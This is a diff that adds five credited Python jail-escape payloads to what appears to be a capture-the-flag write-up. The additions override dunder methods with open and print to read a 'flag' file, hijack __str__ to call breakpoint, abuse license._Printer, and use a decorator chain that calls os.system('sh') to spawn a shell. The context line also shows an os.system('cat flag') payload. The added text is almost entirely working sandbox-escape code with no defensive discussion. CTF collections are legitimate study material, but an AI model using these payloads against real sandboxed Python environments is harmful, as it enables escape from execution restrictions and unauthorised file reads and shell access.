@@ -219,6 +219,67 @@ tree["__import__('os').system('cat flag')"]
 
 - more concise version of payload number 2
 
+17. @Aquild
+
+```python
+class Functions:
+    __add__ = open
+    __sub__ = iter
+    __mul__ = print
+
+try:
+    raise Functions
+except Functions as funs:
+    # equivalent to `for block in iter(open("flag")):`
+    for block in funs - (funs * "flag"):
+        funs + block # equivalent to `print(block)`
+```
+
+18. @Ciarán
+
+```python
+tree.__class__.__str__=breakpoint
+f"{tree}"
+```
+
+19. @A-Z
+
+```python
+@os.system
+@(lambda _: 'sh')
+class _: pass
+```
+
+20. @voxal
+
+```python
+license._Printer__filenames = ["flag"]
+license._Printer__lines = False
+class Esc(Exception): __init__ = license
+raise Esc
+```
+
+21. @beepboop
+
+```python
+filename_arg = lambda x: "flag"
+read_fn = lambda x: x.read
+
+@read_fn
+@open
+@filename_arg
+def get_read_fn():
+    pass
+
+number_arg = lambda x: 1000
+
+@print
+@get_read_fn
+@number_arg
+def print_read_fn():
+    pass 
+```
+
 ### Appendix
 
 Source code
